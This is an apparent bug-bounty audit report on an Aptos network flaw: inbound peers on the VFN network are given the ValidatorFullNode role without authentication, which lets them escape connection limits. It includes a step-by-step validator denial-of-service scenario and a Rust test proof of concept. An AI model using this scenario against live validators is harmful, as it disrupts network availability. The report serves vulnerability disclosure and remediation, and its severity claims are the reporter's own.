# Audit Report

## Title
Critical Role Escalation via Unsafe Peer Role Inference Enables Connection Limit Bypass and Validator DoS

## Summary
An attacker can bypass inbound connection limits and exhaust validator resources by exploiting unsafe peer role inference logic in the VFN (Validator Full Node) network handshake. The vulnerability allows any attacker to gain `PeerRole::ValidatorFullNode` privileges without cryptographic authentication, bypassing connection limits intended only for `PeerRole::Unknown` peers.

## Finding Description

The Aptos network layer contains a critical flaw in how it assigns peer roles during the Noise handshake for non-mutually-authenticated networks. Specifically, the VFN network uses `MaybeMutual` authentication mode, which allows unauthenticated inbound connections.

**The Root Cause:**

When a validator receives an inbound connection on the VFN network from a peer NOT in its trusted peers set, the handshake code makes an unsafe assumption: [1](#0-0) 

The code assumes that ANY inbound connection on the VFN network must be from a legitimate VFN, and assigns `PeerRole::ValidatorFullNode` accordingly. This assumption has no cryptographic backing - any attacker can connect to the VFN port and receive this privileged role.

**Why VFN Networks Use MaybeMutual Auth:**

By default, VFN networks disable mutual authentication: [2](#0-1) 

This means the VFN network uses `HandshakeAuthMode::MaybeMutual`, triggering the unsafe role inference.

**The Access Control Bypass:**

The assigned peer role is then used for critical access control decisions that assume "non-Unknown role = trusted peer":

**1. Connection Limit Bypass:** [3](#0-2) 

The code only enforces inbound connection limits on peers with `PeerRole::Unknown`. The comment explicitly states "if it's not `Unknown` then it is trusted" - **this is false**. An attacker with `PeerRole::ValidatorFullNode` completely bypasses these limits.

**2. Stale Connection Preservation:** [4](#0-3) 

The connectivity manager refuses to close "stale" connections (connections to peers not in the trusted set) if they have `PeerRole::ValidatorFullNode` or `PeerRole::Unknown`. The TODO comment acknowledges the issue: "We should prevent `Unknown` from discovery sources."

**Attack Scenario:**

1. Attacker identifies a validator's VFN network port (publicly discoverable)
2. Attacker opens many TCP connections to the VFN port
3. Each connection completes the Noise handshake and is assigned `PeerRole::ValidatorFullNode` via the unsafe inference
4. These connections bypass the `max_inbound_connections` limit (default: 100 connections)
5. These connections are never cleaned up as "stale"
6. Attacker exhausts validator's connection resources, preventing legitimate VFNs from connecting

**Broken Invariants:**

- **Access Control**: Untrusted attackers gain privileged `ValidatorFullNode` role without authentication
- **Resource Limits**: Inbound connection limits are completely bypassed
- **Network Availability**: Validators can be denied service, affecting consensus liveness

## Impact Explanation

This vulnerability qualifies as **Critical Severity** under the Aptos Bug Bounty program for the following reasons:

1. **Total Loss of Liveness/Network Availability**: By exhausting a validator's connection slots on the VFN network, an attacker can prevent legitimate VFNs from connecting to the validator. Since validators rely on their VFNs for certain network operations, this disrupts validator functionality.

2. **Validator Node Degradation**: Excessive connections consume memory, CPU cycles (for processing ping/pong messages), and network bandwidth, degrading validator performance during consensus rounds.

3. **Low Attack Cost**: The attack requires no special resources - just the ability to open TCP connections to a publicly accessible VFN port.

4. **Affects Multiple Validators**: A single attacker can target multiple validators simultaneously, potentially affecting network-wide consensus liveness if enough validators are impacted.

The impact aligns with the "Total loss of liveness/network availability" critical severity category, as it can prevent validators from operating normally.

## Likelihood Explanation

**Likelihood: HIGH**

The vulnerability is highly likely to be exploited because:

1. **No Prerequisites**: Attacker needs no special access, credentials, or stake
2. **Public Attack Surface**: VFN network ports are publicly accessible by design
3. **Trivial Exploitation**: Opening TCP connections requires minimal technical skill
4. **Immediate Impact**: Connection slot exhaustion happens immediately upon opening connections
5. **No Detection**: Connections appear as legitimate VFN connections in logs
6. **Persistent**: Connections remain open indefinitely due to stale connection exemption

The only limiting factor is that validators may have firewall rules restricting VFN port access, but this is not a guaranteed mitigation.

## Recommendation

**Short-term Fix:**

Remove the unsafe role inference for VFN networks. Unknown peers should be assigned `PeerRole::Unknown`:

```rust
// In network/framework/src/noise/handshake.rs, lines 406-423
// Try to infer the role from the network context
if self.network_context.role().is_validator() {
    if network_id.is_vfn_network() {
        // Do NOT assume inbound connections are VFNs
        // Assign Unknown role instead
        Ok(PeerRole::Unknown)
    } else {
        Ok(PeerRole::Unknown)
    }
} else {
    Ok(PeerRole::Unknown)
}
```

**Long-term Fix:**

1. **Enforce mutual authentication on VFN networks**: Require all VFN connections to be mutually authenticated with trusted peers in the validator set.

2. **Populate VFN trusted peers from on-chain data**: When the validator set updates via on-chain discovery, populate the VFN network's trusted peers set with the actual VFNs associated with each validator.

3. **Remove role-based connection limit exemptions**: Apply connection limits uniformly regardless of role, or check trusted peer status directly rather than relying on role inference.

## Proof of Concept

```rust
// PoC demonstrating the vulnerability
// File: network/framework/src/noise/test_role_escalation.rs

#[cfg(test)]
mod role_escalation_poc {
    use super::*;
    use aptos_config::{config::{Peer, PeerRole, RoleType}, network_id::{NetworkContext, NetworkId}};
    use aptos_crypto::x25519;
    use aptos_memsocket::MemorySocket;
    use aptos_network::application::storage::PeersAndMetadata;
    use aptos_types::PeerId;
    use futures::executor::block_on;
    
    #[test]
    fn test_vfn_role_escalation_attack() {
        aptos_logger::Logger::init_for_testing();
        
        // Setup: Create a validator node with VFN network (MaybeMutual auth)
        let validator_key = x25519::PrivateKey::generate(&mut rand::rngs::OsRng);
        let validator_pubkey = validator_key.public_key();
        let validator_peer_id = aptos_types::account_address::from_identity_public_key(validator_pubkey);
        
        let validator_context = NetworkContext::new(
            RoleType::Validator,
            NetworkId::Vfn,
            validator_peer_id
        );
        
        // Validator has empty trusted peers (attacker not in set)
        let peers_and_metadata = PeersAndMetadata::new(&[NetworkId::Vfn]);
        
        let validator_upgrader = crate::noise::handshake::NoiseUpgrader::new(
            validator_context,
            validator_key,
            crate::noise::handshake::HandshakeAuthMode::maybe_mutual(peers_and_metadata)
        );
        
        // Attack: Attacker connects with their own key (not in trusted peers)
        let attacker_key = x25519::PrivateKey::generate(&mut rand::rngs::OsRng);
        let attacker_pubkey = attacker_key.public_key();
        let attacker_peer_id = aptos_types::account_address::from_identity_public_key(attacker_pubkey);
        
        let attacker_context = NetworkContext::new(
            RoleType::FullNode,
            NetworkId::Vfn,
            attacker_peer_id
        );
        
        let attacker_peers = PeersAndMetadata::new(&[NetworkId::Vfn]);
        // Add validator to attacker's trusted peers so outbound connection succeeds
        attacker_peers.set_trusted_peers(&NetworkId::Vfn, hashmap!{
            validator_peer_id => Peer::new(
                vec![],
                [validator_pubkey].into_iter().collect(),
                PeerRole::Validator
            )
        }).unwrap();
        
        let attacker_upgrader = crate::noise::handshake::NoiseUpgrader::new(
            attacker_context,
            attacker_key,
            crate::noise::handshake::HandshakeAuthMode::maybe_mutual(attacker_peers)
        );
        
        // Perform handshake
        let (dialer_socket, listener_socket) = MemorySocket::new_pair();
        
        let (attacker_result, validator_result) = block_on(futures::future::join(
            attacker_upgrader.upgrade_outbound(
                dialer_socket,
                validator_peer_id,
                validator_pubkey,
                crate::noise::handshake::AntiReplayTimestamps::now
            ),
            validator_upgrader.upgrade_inbound(listener_socket)
        ));
        
        // Verify: Attacker successfully connects
        attacker_result.expect("Attacker should connect");
        let (_, connected_peer_id, assigned_role) = validator_result.expect("Validator should accept");
        
        // VULNERABILITY: Attacker is assigned ValidatorFullNode role!
        assert_eq!(connected_peer_id, attacker_peer_id);
        assert_eq!(assigned_role, PeerRole::ValidatorFullNode, 
            "VULNERABILITY: Attacker was assigned ValidatorFullNode role without authentication!");
        
        // This role bypasses connection limits in peer_manager.rs
        // and prevents stale connection cleanup in connectivity_manager.rs
        
        println!("âœ— VULNERABILITY CONFIRMED: Attacker gained ValidatorFullNode privileges");
        println!("  - Bypasses inbound connection limits");
        println!("  - Prevents stale connection cleanup");
        println!("  - Can exhaust validator resources");
    }
}
```

**Steps to reproduce:**
1. Add the above test to `network/framework/src/noise/handshake.rs`
2. Run: `cargo test test_vfn_role_escalation_attack -- --nocapture`
3. Observe that the attacker successfully receives `PeerRole::ValidatorFullNode` despite not being in the trusted peers set

**Notes**

The vulnerability stems from a dangerous assumption in the handshake logic that conflates network topology with authentication status. The TODO comment in the connectivity manager code indicates the developers were aware of issues with role inference from untrusted sources, but the fix was never implemented. This represents a fundamental breach of the principle that access control decisions must be based on cryptographic authentication, not network-layer heuristics.

### Citations

**File:** network/framework/src/noise/handshake.rs (L406-416)
```rust
                            // Try to infer the role from the network context
                            if self.network_context.role().is_validator() {
                                if network_id.is_vfn_network() {
                                    // Inbound connections to validators on the VFN network must be VFNs
                                    Ok(PeerRole::ValidatorFullNode)
                                } else {
                                    // Otherwise, they're unknown. Validators will connect through
                                    // authenticated channels (on the validator network) so shouldn't hit
                                    // this, and PFNs will connect on public networks (which aren't common).
                                    Ok(PeerRole::Unknown)
                                }
```

**File:** config/src/config/network_config.rs (L135-142)
```rust
    pub fn network_with_id(network_id: NetworkId) -> NetworkConfig {
        let mutual_authentication = network_id.is_validator_network();
        let mut config = Self {
            discovery_method: DiscoveryMethod::None,
            discovery_methods: Vec::new(),
            identity: Identity::None,
            listen_address: "/ip4/0.0.0.0/tcp/6180".parse().unwrap(),
            mutual_authentication,
```

**File:** network/framework/src/peer_manager/mod.rs (L352-389)
```rust
        if conn.metadata.origin == ConnectionOrigin::Inbound {
            // Everything below here is meant for unknown peers only. The role comes from
            // the Noise handshake and if it's not `Unknown` then it is trusted.
            if conn.metadata.role == PeerRole::Unknown {
                // TODO: Keep track of somewhere else to not take this hit in case of DDoS
                // Count unknown inbound connections
                let unknown_inbound_conns = self
                    .active_peers
                    .iter()
                    .filter(|(peer_id, (metadata, _))| {
                        metadata.origin == ConnectionOrigin::Inbound
                            && trusted_peers
                                .get(peer_id)
                                .is_none_or(|peer| peer.role == PeerRole::Unknown)
                    })
                    .count();

                // Reject excessive inbound connections made by unknown peers
                // We control outbound connections with Connectivity manager before we even send them
                // and we must allow connections that already exist to pass through tie breaking.
                if !self
                    .active_peers
                    .contains_key(&conn.metadata.remote_peer_id)
                    && unknown_inbound_conns + 1 > self.inbound_connection_limit
                {
                    info!(
                        NetworkSchema::new(&self.network_context)
                            .connection_metadata_with_address(&conn.metadata),
                        "{} Connection rejected due to connection limit: {}",
                        self.network_context,
                        conn.metadata
                    );
                    counters::connections_rejected(&self.network_context, conn.metadata.origin)
                        .inc();
                    self.disconnect(conn);
                    return;
                }
            }
```

**File:** network/framework/src/connectivity_manager/mod.rs (L492-502)
```rust
                    // If we're using server only auth, we need to not evict unknown peers
                    // TODO: We should prevent `Unknown` from discovery sources
                    if !self.mutual_authentication
                        && metadata.origin == ConnectionOrigin::Inbound
                        && (metadata.role == PeerRole::ValidatorFullNode
                            || metadata.role == PeerRole::Unknown)
                    {
                        None
                    } else {
                        Some(*peer_id) // The peer is stale
                    }
```
